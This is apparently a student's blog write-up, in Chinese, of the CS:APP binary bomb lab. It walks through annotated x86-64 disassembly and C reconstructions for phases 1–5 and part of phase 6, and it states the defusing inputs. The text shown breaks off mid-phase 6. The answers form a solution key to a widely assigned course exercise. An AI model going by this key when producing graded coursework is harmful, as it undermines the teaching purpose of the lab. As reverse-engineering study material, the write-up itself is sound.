<h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>​    先看反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:       48 83 ec 08             sub    $0x8,%rsp	# 开辟栈帧</span><br><span class="line">  400ee4:       be 00 24 40 00          mov    $0x402400,%esi # 传参</span><br><span class="line">  400ee9:       e8 4a 04 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:       85 c0                   test   %eax,%eax</span><br><span class="line">  400ef0:       74 05                   je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:       e8 43 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  400efb:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>​    第一题其实是非常友好的，从反汇编中可以很明显看出来这个测试的思路就是把要比较的东西放到<code>0x402400</code>，然后调用<code>strings_not_equal</code>，那在这里加断点看这个内存的值就行了。</p>
<h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>​    还是先看反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:       55                      push   %rbp # 保存寄存器</span><br><span class="line">  400efd:       53                      push   %rbx</span><br><span class="line">  400efe:       48 83 ec 28             sub    $0x28,%rsp # 开辟栈帧</span><br><span class="line">  400f02:       48 89 e6                mov    %rsp,%rsi # 把栈指针的地址作为参数</span><br><span class="line">  400f05:       e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt; # 读数据</span><br><span class="line">  400f0a:       83 3c 24 01             cmpl   $0x1,(%rsp)	# 将栈顶元素和第一个数据比较</span><br><span class="line">  400f0e:       74 20                   je     400f30 &lt;phase_2+0x34&gt; # 不相等就爆掉</span><br><span class="line">  400f10:       e8 25 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:       eb 19                   jmp    400f30 &lt;phase_2+0x34&gt; # 跳转</span><br><span class="line">  400f17:       8b 43 fc                mov    -0x4(%rbx),%eax # 取%rbx对应的上一个数</span><br><span class="line">  400f1a:       01 c0                   add    %eax,%eax # 变成二倍</span><br><span class="line">  400f1c:       39 03                   cmp    %eax,(%rbx)	# 前一个数的二倍和现在比较</span><br><span class="line">  400f1e:       74 05                   je     400f25 &lt;phase_2+0x29&gt;	# 不相等就爆炸</span><br><span class="line">  400f20:       e8 15 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:       48 83 c3 04             add    $0x4,%rbx</span><br><span class="line">  400f29:       48 39 eb                cmp    %rbp,%rbx</span><br><span class="line">  400f2c:       75 e9                   jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:       eb 0c                   jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:       48 8d 5c 24 04          lea    0x4(%rsp),%rbx # 把第二个数给%rbx</span><br><span class="line">  400f35:       48 8d 6c 24 18          lea    0x18(%rsp),%rbp	# 0x18其实就是十进制的24，那%rbp是作为一个结束标志</span><br><span class="line">  400f3a:       eb db                   jmp    400f17 &lt;phase_2+0x1b&gt; # 循环</span><br><span class="line">  400f3c:       48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  400f40:       5b                      pop    %rbx</span><br><span class="line">  400f41:       5d                      pop    %rbp</span><br><span class="line">  400f42:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>​    首先其实这些函数最开始的<code>push</code>操作和结尾<code>pop</code>操作都不用管，是保存<strong>被调用者保存寄存器</strong>的过程。然后它调用了<code>read_six_numbers</code>，明显这次的答案就是六个数字。</p>
<p>​    在调用完之后，直接使用了命令<code>cmpl $0x1,(%rsp)</code>，也就是把栈顶元素和1比较，如果不相等就直接炸掉了。那么我们就可以确定第一个数是1了。确定了第一个是1，去看跳转到的地址，发现这里用<code>%rbx</code>存第二个数的地址，同时用<code>%rbp</code>表示读完最后一个数后的栈地址，应该是作为计数器的。然后再看跳转到的地址，发现它用<code>%eax</code>存<code>%rbx</code>的上一个数，然后变成两倍，和当前的<code>%rbx</code>比较，如果相等就让<code>%rbx</code>指向下一个数，循环下去。</p>
<p>​    说到这里其实答案已经很明显了吧，就是一个1为首项，2为公比的等比数列。</p>
<h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p>​    依然是先看反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:       48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  400f47:       48 8d 4c 24 0c          lea    0xc(%rsp),%rcx # 第二个数的地址</span><br><span class="line">  400f4c:       48 8d 54 24 08          lea    0x8(%rsp),%rdx	# 第一个数的地址</span><br><span class="line">  400f51:       be cf 25 40 00          mov    $0x4025cf,%esi # 发现是读了两个数</span><br><span class="line">  400f56:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400f5b:       e8 90 fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:       83 f8 01                cmp    $0x1,%eax # 检查一下是不是只读了一个数</span><br><span class="line">  400f63:       7f 05                   jg     400f6a &lt;phase_3+0x27&gt; # 是就爆炸，否则跳转</span><br><span class="line">  400f65:       e8 d0 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:       83 7c 24 08 07          cmpl   $0x7,0x8(%rsp) # 比较第一个数和7的大小</span><br><span class="line">  400f6f:       77 3c                   ja     400fad &lt;phase_3+0x6a&gt; # 大了就爆炸</span><br><span class="line">  400f71:       8b 44 24 08             mov    0x8(%rsp),%eax # 把第一个数给eax</span><br><span class="line">  400f75:       ff 24 c5 70 24 40 00    jmpq   *0x402470(,%rax,8) # 跳转到rax所决定的地址</span><br><span class="line">  400f7c:       b8 cf 00 00 00          mov    $0xcf,%eax</span><br><span class="line">  400f81:       eb 3b                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:       b8 c3 02 00 00          mov    $0x2c3,%eax # 把这个值给rax</span><br><span class="line">  400f88:       eb 34                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:       b8 00 01 00 00          mov    $0x100,%eax</span><br><span class="line">  400f8f:       eb 2d                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:       b8 85 01 00 00          mov    $0x185,%eax</span><br><span class="line">  400f96:       eb 26                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:       b8 ce 00 00 00          mov    $0xce,%eax</span><br><span class="line">  400f9d:       eb 1f                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:       b8 aa 02 00 00          mov    $0x2aa,%eax</span><br><span class="line">  400fa4:       eb 18                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:       b8 47 01 00 00          mov    $0x147,%eax</span><br><span class="line">  400fab:       eb 11                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:       e8 88 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400fb7:       eb 05                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:       b8 37 01 00 00          mov    $0x137,%eax</span><br><span class="line">  400fbe:       3b 44 24 0c             cmp    0xc(%rsp),%eax # 把第二个数和rax的那个值作比较</span><br><span class="line">  400fc2:       74 05                   je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:       e8 71 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:       48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  400fcd:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>​    首先还是先确定输入了什么吧，注意到在<code>0x400f5b</code>调用了<code>scanf</code>函数，再网上看一点可以发现<code>$0x4025cf</code>这个有点特殊的东西，打印一下发现是<code>&quot;%d %d&quot;</code>，那就说明对应的值是两个<code>int</code>型了，此外注意到<code>400f47</code>位置附近的指令，可以意识到<code>%rsp+8</code>指向第一个数，而<code>%rsp+c</code>指向第二个数。这是由于<code>%rdx</code>和<code>%rcx</code>分别是调用函数的第三个参数和第四个参数，可以想一下<code>scanf(&quot;%d %d&quot;,&amp;a,&amp;b)</code>，和这个形式是对应的。</p>
<p>​    接下来是对于输入格式的检查，之后判断第一个数和7的大小，发现如果超过7的话就会爆掉，所以第一个数要小于7，然后继续往下看，它把第一个数赋给<code>%rax</code>，然后跳转到<code>0x402470+8*%rax</code>这个位置，那我们可以打印一下这个位置的对应的地址值，如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144223671.png" alt="image-20220326144223671"></p>
<p>​    因为我们这里输入的第一个数是2，所以就跳转到了<code>0x400f83</code>，<strong>注意这里面全都是16进制</strong>。到了这个地址之后我们发现它把<code>0x2c3</code>付给了<code>%rax</code>，然后跳转，最后是把第二个数和<code>%rax</code>中的值比较。所以这个时候第二个数就是<code>0x2c3</code></p>
<p>​    此外这里除了<code>2 707</code>这组之外还有一些别的答案，方法完全是一样的，就不再赘述了。</p>
<h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>​    还是先看反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:                                    </span><br><span class="line">  40100c:       48 83 ec 18             sub    $0x18,%rsp              </span><br><span class="line">  401010:       48 8d 4c 24 0c          lea    0xc(%rsp),%rcx       </span><br><span class="line">  401015:       48 8d 54 24 08          lea    0x8(%rsp),%rdx       </span><br><span class="line">  40101a:       be cf 25 40 00          mov    $0x4025cf,%esi           </span><br><span class="line">  40101f:       b8 00 00 00 00          mov    $0x0,%eax                 </span><br><span class="line">  401024:       e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:       83 f8 02                cmp    $0x2,%eax               </span><br><span class="line">  40102c:       75 07                   jne    401035 &lt;phase_4+0x29&gt;  # 和上面那个都是一样的  </span><br><span class="line">  40102e:       83 7c 24 08 0e          cmpl   $0xe,0x8(%rsp)    # 比较第一个数和e        </span><br><span class="line">  401033:       76 05                   jbe    40103a &lt;phase_4+0x2e&gt;     # 大了就会爆</span><br><span class="line">  401035:       e8 00 04 00 00          callq  40143a &lt;explode_bomb&gt;    </span><br><span class="line">  40103a:       ba 0e 00 00 00          mov    $0xe,%edx      # edx=e          </span><br><span class="line">  40103f:       be 00 00 00 00          mov    $0x0,%esi      # esi=0     </span><br><span class="line">  401044:       8b 7c 24 08             mov    0x8(%rsp),%edi      # edi=第一个数      </span><br><span class="line">  401048:       e8 81 ff ff ff          callq  400fce &lt;func4&gt;      # 进入函数func4     </span><br><span class="line">  40104d:       85 c0                   test   %eax,%eax       # 测试返回值是否是0          </span><br><span class="line">  40104f:       75 07                   jne    401058 &lt;phase_4+0x4c&gt;  # 不是就爆炸    </span><br><span class="line">  401051:       83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)     # 第二个数是否是0</span><br><span class="line">  401056:       74 05                   je     40105d &lt;phase_4+0x51&gt;  # 是就结束</span><br><span class="line">  401058:       e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;     </span><br><span class="line">  40105d:       48 83 c4 18             add    $0x18,%rsp          </span><br><span class="line">  401061:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>​    这里在读取数据之间的操作都完全一样，也就是读了两个数，存到了栈上，并且在读完后检查了输入，然后往下看。先是把第一个数和e进行比较，如果大于的话就会爆炸，否则跳转，在跳转之后，把e和0分别赋给<code>%edx</code>和<code>%esi</code>，然后把第一个数赋给了<code>%edi</code>，这里其实就是指定了传参的值的。然后调用函数<code>func4</code>，其实再往下看一下，会发现在<code>0x401051</code>处比较了第二个数和0的大小，如果不等于的话就会爆炸，那我们基本就可以确定第二个数就是0了，此外我们也可以去欸的那个如果返回值不是0的话就会爆炸，然后我们看一下<code>func4</code>的反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:                                        </span><br><span class="line">  400fce:       48 83 ec 08             sub    $0x8,%rsp   # 开辟栈帧    </span><br><span class="line">  400fd2:       89 d0                   mov    %edx,%eax    # 把e给eax</span><br><span class="line">  400fd4:       29 f0                   sub    %esi,%eax      # eax-0</span><br><span class="line">  400fd6:       89 c1                   mov    %eax,%ecx       # ecx=e</span><br><span class="line">  400fd8:       c1 e9 1f                shr    $0x1f,%ecx     # 右移0x1f位，ecx=0</span><br><span class="line">  400fdb:       01 c8                   add    %ecx,%eax     # eax=e</span><br><span class="line">  400fdd:       d1 f8                   sar    %eax      # eax=7</span><br><span class="line">  400fdf:       8d 0c 30                lea    (%rax,%rsi,1),%ecx      # ecx=7</span><br><span class="line">  400fe2:       39 f9                   cmp    %edi,%ecx       # 比较第一个数和7</span><br><span class="line">  400fe4:       7e 0c                   jle    400ff2 &lt;func4+0x24&gt;     # 大于等于就跳转</span><br><span class="line">  400fe6:       8d 51 ff                lea    -0x1(%rcx),%edx    # 否则更改edx的值，递归调用      </span><br><span class="line">  400fe9:       e8 e0 ff ff ff          callq  400fce &lt;func4&gt;    # 或许就相当于func4(第一个数,0,6)</span><br><span class="line">  400fee:       01 c0                   add    %eax,%eax        </span><br><span class="line">  400ff0:       eb 15                   jmp    401007 &lt;func4+0x39&gt;      </span><br><span class="line">  400ff2:       b8 00 00 00 00          mov    $0x0,%eax     # eax=0        </span><br><span class="line">  400ff7:       39 f9                   cmp    %edi,%ecx      # 比较第一个数和ecx   </span><br><span class="line">  400ff9:       7d 0c                   jge    401007 &lt;func4+0x39&gt;     # ecx大于第一个数就退出，返回0</span><br><span class="line">  400ffb:       8d 71 01                lea    0x1(%rcx),%esi     </span><br><span class="line">  400ffe:       e8 cb ff ff ff          callq  400fce &lt;func4&gt;     # 递归调用func4(第一个数，ecx+1，ecx)      </span><br><span class="line">  401003:       8d 44 00 01             lea    0x1(%rax,%rax,1),%eax     </span><br><span class="line">  401007:       48 83 c4 08             add    $0x8,%rsp                 </span><br><span class="line">  40100b:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>​    其实只需要注意到在<code>0x400fe4</code>的部分只要跳转就不会爆炸，就可以直截了当的让第一个数为7，那这么一个题也就算是过去了。</p>
<p>​    当然可以对照着反汇编大致翻译出相应的C函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> first,<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result=b;</span><br><span class="line">    result-=a;</span><br><span class="line">    <span class="keyword">int</span> ecx=result;</span><br><span class="line">    ecx=(<span class="keyword">unsigned</span>)ecx&gt;&gt;<span class="number">31</span>;</span><br><span class="line">    result+=ecx;</span><br><span class="line">    result/=<span class="number">2</span>;</span><br><span class="line">    ecx=a+result;</span><br><span class="line">    <span class="keyword">if</span>(ecx&lt;=first)</span><br><span class="line">    &#123;</span><br><span class="line">         result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(ecx&gt;=first)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            a=ecx+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> p=<span class="built_in">func4</span>(first,a,b)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>*p+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       	b=ecx<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> p=<span class="built_in">func4</span>(first,a,b);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 上面写的太混乱了，下面整理一下</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> first,<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 	<span class="keyword">int</span> ecx=b-a;</span><br><span class="line">    ecx=((<span class="keyword">int</span>)(((<span class="keyword">unsigned</span>)ecx&gt;&gt;<span class="number">31</span>)+ecx)&gt;&gt;<span class="number">1</span>)+a;</span><br><span class="line">    <span class="keyword">if</span>(ecx&lt;first)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">func4</span>(first,ecx+<span class="number">1</span>,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(ecx&gt;first)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">func4</span>(first,a,ecx<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    然后其实可以相应的跑一下这个函数，因为我们在<code>phase_4</code>函数中可以知道第一个数的范围，所以可以枚举来得到最终的几种可能。</p>
<h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>​    还是先看反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:       53                      push   %rbx</span><br><span class="line">  401063:       48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line">  401067:       48 89 fb                mov    %rdi,%rbx</span><br><span class="line">  40106a:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:       00 00</span><br><span class="line">  401073:       48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:       31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:       e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:       83 f8 06                cmp    $0x6,%eax # 读了六个字符</span><br><span class="line">  401082:       74 4e                   je     4010d2 &lt;phase_5+0x70&gt; # 是六个就不会炸</span><br><span class="line">  401084:       e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:       eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt; # 跳转</span><br><span class="line">  40108b:       0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx # 取出输入的第rax个字符</span><br><span class="line">  40108f:       88 0c 24                mov    %cl,(%rsp) # 取低位到栈底</span><br><span class="line">  401092:       48 8b 14 24             mov    (%rsp),%rdx # 放到rdx</span><br><span class="line">  401096:       83 e2 0f                and    $0xf,%edx # 得到低四位</span><br><span class="line">  401099:       0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx # 得到这个内存地址的rdx处的字符</span><br><span class="line">  4010a0:       88 54 04 10             mov    %dl,0x10(%rsp,%rax,1) # 放到栈上</span><br><span class="line">  4010a4:       48 83 c0 01             add    $0x1,%rax # 计数器增加</span><br><span class="line">  4010a8:       48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line">  4010ac:       75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:       c6 44 24 16 00          movb   $0x0,0x16(%rsp) # 添加串尾</span><br><span class="line">  4010b3:       be 5e 24 40 00          mov    $0x40245e,%esi # 获取目的串</span><br><span class="line">  4010b8:       48 8d 7c 24 10          lea    0x10(%rsp),%rdi # 获取输入串</span><br><span class="line">  4010bd:       e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt; # 比较</span><br><span class="line">  4010c2:       85 c0                   test   %eax,%eax # 看是否相等</span><br><span class="line">  4010c4:       74 13                   je     4010d9 &lt;phase_5+0x77&gt; # 相等就退出</span><br><span class="line">  4010c6:       e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:       eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:       b8 00 00 00 00          mov    $0x0,%eax # eax清零</span><br><span class="line">  4010d7:       eb b2                   jmp    40108b &lt;phase_5+0x29&gt; # 跳到关键循环</span><br><span class="line">  4010d9:       48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:       64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:       00 00</span><br><span class="line">  4010e7:       74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:       e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:       48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:       5b                      pop    %rbx</span><br><span class="line">  4010f3:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>​    首先还是一样的思路，先确定要输入的值的格式。然后就直接跳转了，跟着转过去之后发现它就是把0赋给<code>rax</code>，然后又跳了回去。跳过去之后可以看看相关寄存器的值啊，比如<code>rbx</code>，惊喜的发现它里面存着的就是刚刚咱们输入的字符串，那么<code>rax</code>的作用大概就像是一个计数器，然后它把<code>cl</code>赋给了栈底，其实这个就是<code>ecx</code>的低字节，然后再把这个赋给了<code>rdx</code>，再和<code>0xf</code>做一个与运算，实际上就是只保留这个寄存器的最后四位。接下来它做了这样一个赋值<code>movzbl 0x4024b0(%rdx),%edx</code>，那讲道理是不是就可以看一下<code>0x4024b0</code>的地址存的是什么。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144251571.png" alt="image-20220326144251571"></p>
<p>​    所以这一步其实就是把咱们输入的那个串的后四位作为一个偏移地址，这个位置的对应的字符，存到<code>edx</code>里。再往后看，它把这个字符存到了栈上，然后改变计数器的值。再循环完之后，注意到它取出了<code>0x4025e</code>这个地址的值，那讲道理也可以看一下这个地址是什么。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144312544.png" alt="image-20220326144312544"></p>
<p>​    然后，它调用了那个熟悉的函数<code>strings_not_equal</code>。</p>
<p>​    到这里其实就很清晰了，这个题大概是做了一个映射，即</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">array[input[i]&amp;<span class="number">0xf</span>]==obj[i];</span><br></pre></td></tr></table></figure>
<p>​    所以只需要对照ascii码表找出答案就行了。</p>
<h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>​    最后这个不能再先看汇编了，汇编太长看起来晕乎乎的。个人感觉phase_6的难度比前面五个高了一大截。</p>
<p>​    首先先来看输入阶段的汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:       41 56                   push   %r14</span><br><span class="line">  4010f6:       41 55                   push   %r13</span><br><span class="line">  4010f8:       41 54                   push   %r12</span><br><span class="line">  4010fa:       55                      push   %rbp</span><br><span class="line">  4010fb:       53                      push   %rbx # 保存寄存器值</span><br><span class="line">  4010fc:       48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line">  401100:       49 89 e5                mov    %rsp,%r13 </span><br><span class="line">  401103:       48 89 e6                mov    %rsp,%rsi</span><br><span class="line">  401106:       e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure>
<p>​    首先还是能看出来这一阶段的答案是六个数，然后几个<code>r13</code>这种的寄存器都指向栈底，接下来看下一部分的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40110b:       49 89 e6                mov    %rsp,%r14 </span><br><span class="line">40110e:       41 bc 00 00 00 00       mov    $0x0,%r12d</span><br><span class="line">401114:       4c 89 ed                mov    %r13,%rbp # 更新rbp</span><br><span class="line">401117:       41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line">40111b:       83 e8 01                sub    $0x1,%eax # eax-1</span><br><span class="line">40111e:       83 f8 05                cmp    $0x5,%eax # 和5比较</span><br><span class="line">401121:       76 05                   jbe    401128 &lt;phase_6+0x34&gt; # 大于就会爆掉</span><br><span class="line">401123:       e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:       41 83 c4 01             add    $0x1,%r12d # r12d作为一个计数器</span><br><span class="line">40112c:       41 83 fc 06             cmp    $0x6,%r12d # 循环小于6次</span><br><span class="line">401130:       74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">401132:       44 89 e3                mov    %r12d,%ebx </span><br><span class="line">401135:       48 63 c3                movslq %ebx,%rax</span><br><span class="line">401138:       8b 04 84                mov    (%rsp,%rax,4),%eax # 取出当前对应的数</span><br><span class="line">40113b:       39 45 00                cmp    %eax,0x0(%rbp) # 和当前rbp对应的值作比较</span><br><span class="line">40113e:       75 05                   jne    401145 &lt;phase_6+0x51&gt; # 相等就会爆炸</span><br><span class="line">401140:       e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:       83 c3 01                add    $0x1,%ebx # ebx也是一个计数器</span><br><span class="line">401148:       83 fb 05                cmp    $0x5,%ebx # 判断是否相等的循环</span><br><span class="line">40114b:       7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">40114d:       49 83 c5 04             add    $0x4,%r13 # 更新r13，进而更行上面的rbp</span><br><span class="line">401151:       eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br></pre></td></tr></table></figure>
<p>​    这里先是将第一个数减一，减一之后需要小于等于5，否则就爆炸，这里的<code>r12d</code>类似于一个计数器，然后继续往下走，把下一个数给<code>rax</code>，然后判断这个数和栈顶（因为这个时候<code>rbp</code>存的还是栈顶，但是后面这个寄存器的值会随着计数器的变化而变化。）的数是否相等，相等的话就会爆掉。然后<code>ebx</code>也算是一个计数器，应该是一个整个的大循环的。</p>
<p>​    总的来看，这里应该是一个二重循环，大概代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(a[i]&gt;<span class="number">6</span>)</span><br><span class="line">        <span class="built_in">bomb</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;<span class="number">6</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==a[j])</span><br><span class="line">            <span class="built_in">bomb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    大概作用就是保证每个数都小于6，同时各不相同。</p>
<p>​    接下来看下一部分的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">401153:       48 8d 74 24 18          lea    0x18(%rsp),%rsi # 设置循环结束标志</span><br><span class="line">401158:       4c 89 f0                mov    %r14,%rax # 设置循环过程中的一个计数器</span><br><span class="line">40115b:       b9 07 00 00 00          mov    $0x7,%ecx # ecx=7</span><br><span class="line">401160:       89 ca                   mov    %ecx,%edx # edx=7</span><br><span class="line">401162:       2b 10                   sub    (%rax),%edx # edx=7-(rax)</span><br><span class="line">401164:       89 10                   mov    %edx,(%rax) # (rax)=edx</span><br><span class="line">401166:       48 83 c0 04             add    $0x4,%rax # 更新计数器</span><br><span class="line">40116a:       48 39 f0                cmp    %rsi,%rax</span><br><span class="line">40116d:       75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>
<p>​    首先因为输入了六个数字，所以这里的<code>rsi</code>应该是作为一个结束标志的。然后把最开始的栈顶分给<code>rax</code>，接下来执行的其实就是一个<code>7-(rax)</code>的操作，然后逐步对每一个都这样操作。</p>
<p>​    所以这一步其实类似于如下代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    a[i]=<span class="number">7</span>-a[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    然后看下一部分的代码</p>
